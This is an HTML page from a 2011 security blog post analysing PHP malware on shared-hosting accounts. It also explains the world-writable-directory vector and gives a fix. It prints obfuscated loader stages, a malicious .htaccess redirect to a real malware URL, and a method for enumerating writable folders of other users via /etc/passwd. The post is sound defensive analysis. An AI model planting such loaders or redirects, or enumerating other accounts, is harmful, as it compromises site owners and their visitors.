@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='From a few months some clients started to complain about their shared-hosting accounts being amazingly owned even if their PHP applications (WordPress mostly) were totally up to date.
+The malware got into most of the PHP files including a PHP snippet that would eval and decode a base64-encoded string containing a script declaration loading Javascript from outside. This Javascript usually initiates download of .exe&#8217;s and stuff.
+A friend&#8217;s account got hacked a few days back by this very same technique.'>
+
+<meta property='og:title' content='Shared-hosting accounts victims of lame directory permissions • wroot'>
+<meta property='og:description' content='From a few months some clients started to complain about their shared-hosting accounts being amazingly owned even if their PHP applications (WordPress mostly) were totally up to date.
+The malware got into most of the PHP files including a PHP snippet that would eval and decode a base64-encoded string containing a script declaration loading Javascript from outside. This Javascript usually initiates download of .exe&#8217;s and stuff.
+A friend&#8217;s account got hacked a few days back by this very same technique.'>
+<meta property='og:url' content='http://wroot.org/posts/shared-hosting-accounts-victims-of-lame-directory-permissions/'>
+<meta property='og:site_name' content='wroot'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts'><meta property='article:tag' content='access control'><meta property='article:tag' content='attack'><meta property='article:tag' content='directory permissions'><meta property='article:tag' content='malware'><meta property='article:tag' content='php'><meta property='article:tag' content='shared hosting'><meta property='article:tag' content='wordpress'><meta property='article:published_time' content='2011-12-14T17:40:00Z'/><meta property='article:modified_time' content='2011-12-14T17:40:00Z'/><meta name='twitter:card' content='summary'><meta name='twitter:site' content='@jseidl'>
+
+<meta name="generator" content="Hugo 0.53" />
+
+  <title>Shared-hosting accounts victims of lame directory permissions • wroot</title>
+  <link rel='canonical' href='http://wroot.org/posts/shared-hosting-accounts-victims-of-lame-directory-permissions/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'><link rel='stylesheet' href='/webfonts/ptserif/main.css'><link rel='stylesheet' href='/webfonts/source-code-pro/main.css'><link rel='stylesheet' href='/css/style.css'>
+  
+
+</head>
+
+
+<body>
+<div id="container">
+    <header id="header">
+    <div id="header-outer" class="outer">
+        <div id="header-inner" class="inner">
+            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+            <a id="logo" class="logo-text" href="http://wroot.org/">wroot</a>
+            <nav id="main-nav">
+                
+                <a class="main-nav-link" href="/about/">About</a>
+                
+                <a class="main-nav-link" href="/talks/">Talks</a>
+                
+                <a class="main-nav-link" href="/projects/">Projects</a>
+                
+                <a class="main-nav-link" href="/press/">Press</a>
+                
+                <a class="main-nav-link" href="https://twitter.com/jseidl">Twitter</a>
+                
+                <a class="main-nav-link" href="https://www.linkedin.com/in/janseidl">LinkedIn</a>
+                
+                <a class="main-nav-link" href="http://github.com/jseidl">GitHub</a>
+                
+                <a class="main-nav-link" href="http://www.slideshare.net/jseidl/">SlideShare</a>
+                
+            </nav>
+            <nav id="sub-nav">
+                <div id="search-form-wrap">
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+    <section id="main" class="outer">
+        <article class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        <header class="article-header">
+            <h1 class="article-title" itemprop="name">Shared-hosting accounts victims of lame directory permissions</h1>
+        </header>
+        
+        <div class="article-meta">
+            
+            <a href="/posts/shared-hosting-accounts-victims-of-lame-directory-permissions/" class="article-date">
+                <time datetime='2011-12-14T17:40:00.000&#43;00:00' itemprop="datePublished">2011-12-14</time>
+            </a>
+            
+            
+            
+            <div class="post-categories">
+                <div class="article-category">
+                    
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/access-control">Access Control</a>
+                    
+                    
+                    <span>&gt;</span>
+                    
+                    <a class="article-category-link" href="http://wroot.org//categories/malware">Malware</a>
+                    
+                </div>
+            </div>
+            
+            
+        </div>
+        <div class="article-entry" itemprop="articleBody">
+            
+
+<p>From a few months some clients started to complain about their shared-hosting accounts being amazingly owned even if their <acronym title="Pre-Hypertext Processing">PHP</acronym> applications (WordPress mostly) were totally up to date.</p>
+
+<p>The malware got into most of the <acronym title="Pre-Hypertext Processing">PHP</acronym> files including a <acronym title="Pre-Hypertext Processing">PHP</acronym> snippet that would <code>eval</code> and decode a base64-encoded string containing a <code>script</code> declaration loading Javascript from outside. This Javascript usually initiates download of .exe&#8217;s and stuff.</p>
+
+<p>A friend&#8217;s account got hacked a few days back by this very same technique. He told me the attacker had left some files over so I asked him to hand me over so I could play a little and reverse-it.</p>
+
+<h2 id="reversing">Reversing</h2>
+
+<p>The code ended up being two times rendering 3 total &#8216;stages&#8217;.</p>
+
+<h3 id="stage-1">Stage 1</h3>
+
+<p>Starts with two vars with random names containing hex-encoded strings that ended up being &#8216;create_function&#8217; and &#8216;base64_decode&#8217;, two regular <acronym title="Pre-Hypertext Processing">PHP</acronym> functions.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">/* Vars */
+	$_8b7b=&#34;\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e&#34;; // create_function
+	$_8b7b1f=&#34;\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65&#34;; // base64_decode</code></pre></div>
+
+<p>Followed by that we have these vars called as functions</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$_8b7b1f56=$_8b7b(&#34;&#34;,$_8b7b1f(&#34;JGs9MT....&#34;));
+// $var=create_function(&#34;&#34;,base64decode(&#34;....</code></pre></div>
+
+<p>And it ends calling this assigned variable as a function&#8230;</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$_8b7b1f56();
+// $var();</code></pre></div>
+
+<p>The base64-encoded code is presented next at</p>
+
+<h3 id="stage-2">Stage 2</h3>
+
+<p>What was base64-encoded is now a function that decodes content from another variable creating a payload string. The very first two variables are the most interesting because they are the &#8220;key&#8221; used to encode the payload, and the encoded payload.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$k=143;
+	$m=explode(&#34;;&#34;,&#34;234;253;253;224;253;208;253;234;255;224;253;251;230;225;232;167;202;208;202;221;221;192;221;175;243;175;202;208;216;206;221;193;198.....&#34;);</code></pre></div>
+
+<p>All the characters of the payload string are presented as numbers that when put to the power of &#8220;key&#8221; will become the corresponding ascii character of the payload.</p>
+
+<p>A very simple for loop makes the math and appends the string.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$z=&#34;&#34;;
+
+	foreach ($m as $v) 
+		if ($v!=&#34;&#34;)
+			$z.=chr($v^$k);
+
+	eval($z);</code></pre></div>
+
+<h3 id="stage-3">Stage 3</h3>
+
+<p>Well, what can I say, the decoded and <code>eval</code>uated string is a very simple <acronym title="Pre-Hypertext Processing">PHP</acronym> shell. It can run unix commands from a variety of techniques (popen, exec, system, passthru &#8212; the first available), can upload files, run php commands or connect to database hosts and run sql queries from the victim account.</p>
+
+<h2 id="artifacts-missing">Artifacts missing</h2>
+
+<p>The script actually used for the infection of the <acronym title="Pre-Hypertext Processing">PHP</acronym> file is missing. Unfortunately as it is a shared-hosting I can&#8217;t reverse the disk for deleted items but it&#8217;s not something very simple. What I deduce is a simple <code>find</code> looking for <acronym title="Pre-Hypertext Processing">PHP</acronym> files and then piping them to a custom-built parser that would add the evil line at the end or after some specific code.</p>
+
+<p>I&#8217;ve seen variants that only infected WordPress&#8217; footer.php template file (as it is included in every other page). This revealed to be a true application-targeted attack.</p>
+
+<h2 id="if-there-are-no-holes-in-the-app-how-the-hell-did-he-got-here">If there are no holes in the app, how the hell did he got here?</h2>
+
+<p>After some manual auditing on the client&#8217;s application I&#8217;ve stated that the compromise couldn&#8217;t be started by the application so I started probing the environment.</p>
+
+<p>Nothing seemed really bad at first but then, when talking to a friend I&#8217;ve noticed the most primary mistake: Directory permissions. So I present you&#8230;</p>
+
+<h2 id="the-attack-vector">The attack vector</h2>
+
+<p>Some WordPress plugin developers make their plugins <code>chmod</code> upload directories world writable (<code>chmod 777</code>) to avoid problems. This is quite stupid but you might not know that most security-unaware developers do this quite often while having permissions issues.</p>
+
+<p>We ran a quick <code>find</code> to see which directories where with write bit set on &#8216;other&#8217;.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">find . -type d -perm -o=w</code></pre></div>
+
+<p>Then, as expected, we got some entries&#8230;</p>
+
+<p>Just having an account on the same machine is enough. The attacker simply copied the files over our writable directory and accessed via his browser.</p>
+
+<p>As a hosting account with <acronym title="Secure Shell">SSH</acronym> access enabled is around 10 bucks/month, this is a really victim-untargeted, cost-effective attack.</p>
+
+<h2 id="enumerating-victims">Enumerating Victims</h2>
+
+<p>After we discovered the vector I jumped to my account and tried to <code>ls /home</code> but I was, as expected, denied.</p>
+
+<p>So I though for a while and realized that <code>/etc/passwd</code> is readable. A little <code>for</code> function with some <code>cut</code> and the find above I was able to scratch down nearly 15.000 (YES, FIFTEEN THOUSAND!!!) world writable folders on this client shared-hosting machine.</p>
+
+<p>Just stopped there because I&#8217;m on the light side ;)</p>
+
+<h2 id="some-nasty-artifacts">Some nasty artifacts</h2>
+
+<p>The infection also affects <code>.htaccess</code> files. Even if you haven&#8217;t one, if you got owned this way, you probably have one now for each site you&#8217;ve hosted.</p>
+
+<p>Google started to mark some sites as attack sites. The pointed out offending url is <em><a href="http://sweepstakesandcontestsinfo.com/nl-in.php?nnn=555">http://sweepstakesandcontestsinfo.com/nl-in.php?nnn=555</a></em>. So I started <code>grepping</code> like there&#8217;s no tomorow. In instants my <code>less</code> become populated by some good eggs.</p>
+
+<p><code>grep</code> was pointing to many <code>.htaccess</code> files with strange <code>RewriteRule</code>s statements. Then I opened the first one and there it was:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-apache" data-lang="apache"><span style="color:#960050;background-color:#1e0010">&amp;lt;</span>IfModule mod_rewrite.c&gt;
+RewriteEngine <span style="color:#66d9ef">On</span>
+RewriteOptions inherit
+RewriteCond %{HTTP_REFERER}
+.<span style="color:#960050;background-color:#1e0010">*(msn|live|altavista|excite|ask|aol|google|mail|bing|yahoo)</span>.<span style="color:#960050;background-color:#1e0010">*$</span> <span style="color:#960050;background-color:#1e0010">[NC]</span>
+RewriteRule .* http://sweepstakesandcontestsinfo.com/nl-in.php?nnn=555 [R,L]
+<span style="color:#960050;background-color:#1e0010">&amp;lt;/IfModule&gt;</span></code></pre></div>
+
+<p>Apparently this malicious snippet is trying to hide itself from the site owner and direct hits, focusing only on hits arrived through search engines like Google, Bing, Yahoo! etc.</p>
+
+<p>What the malware author missed and stood out like a shoot in the foot was that GoogleBot also got into that rule and started pointing out and alerting out users.</p>
+
+<p>Just <code>grep</code> all your files for the <acronym title="Uniform Resource Locator">URL</acronym> mentioned on the report, or access your site from a search engine and see if it acts weird.</p>
+
+<h2 id="fixing">Fixing</h2>
+
+<p>The instant-fix is just runing an extended version of the above command.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -type d -perm -o<span style="color:#f92672">=</span>w -print -exec chmod <span style="color:#ae81ff">755</span> <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span></code></pre></div>
+
+<p>The main reason this happens and have so many occurrences is that application developers often fail to properly configure the user account of the running application and the application&#8217;s filesystem folders so the application can only write to public directories or its user&#8217;s home (which the application is not located there).</p>
+
+<p>Give the application&#8217;s folder owner and group permissions according to the application&#8217;s user and group, then give the application&#8217;s group to the accounts that need to rights to write on it (ex: developers, deploy daemons etc). Then, set up the permissions of the folders accordingly.</p>
+
+<h2 id="it-could-be-worse">It could be worse</h2>
+
+<p>If the whole home directory is 777 (if this wasn&#8217;t bad enough by itself) (and we found some home directories like that on our probe) the attacker could put his key under <code>~/.authorized_keys</code> and gain direct shell access to the account. And then it could be even worse&#8230;</p>
+
+<p>I strongly recommend everyone that has a shared-hosting account to do this little test. It may save your life.</p>
+
+<p>HTH!</p>
+
+        </div>
+
+        
+        
+        <div class="article-toc" >
+            <h3>Contents</h3>
+            <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#reversing">Reversing</a>
+<ul>
+<li><a href="#stage-1">Stage 1</a></li>
+<li><a href="#stage-2">Stage 2</a></li>
+<li><a href="#stage-3">Stage 3</a></li>
+</ul></li>
+<li><a href="#artifacts-missing">Artifacts missing</a></li>
+<li><a href="#if-there-are-no-holes-in-the-app-how-the-hell-did-he-got-here">If there are no holes in the app, how the hell did he got here?</a></li>
+<li><a href="#the-attack-vector">The attack vector</a></li>
+<li><a href="#enumerating-victims">Enumerating Victims</a></li>
+<li><a href="#some-nasty-artifacts">Some nasty artifacts</a></li>
+<li><a href="#fixing">Fixing</a></li>
+<li><a href="#it-could-be-worse">It could be worse</a></li>
+</ul></li>
+</ul>
+</nav>
+        </div>
+        
+        
+
+        
+
+
+        
+        <footer class="article-footer">
+            <ul class="article-tag-list">
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/access-control">access control
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/attack">attack
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/directory-permissions">directory permissions
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/malware">malware
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/php">php
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/shared-hosting">shared hosting
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/wordpress">wordpress
+                    </a>
+                </li>
+                
+            </ul>
+        </footer>
+        
+    </div>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wroot" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    <nav id="article-nav">
+    
+    <a href="/posts/iran-hijacked-us-drone-by-hacking-gps/" id="article-nav-newer" class="article-nav-link-wrap">
+        <div class="article-nav-title"><span>&lt;</span>&nbsp;
+            Iran hijacked US Drone by hacking GPS
+        </div>
+    </a>
+    
+    
+    <a href="/posts/endpoint-dlp-is-hardware-access-control-enough/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">Endpoint DLP: Is hardware access control enough?&nbsp;<span>&gt;</span></div>
+    </a>
+    
+</nav>
+</article>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 wroot&nbsp;
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with (a slightly modified) theme <a href="https://github.com/carsonip/hugo-theme-minos">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+
+</div>
+</body>
+</html>
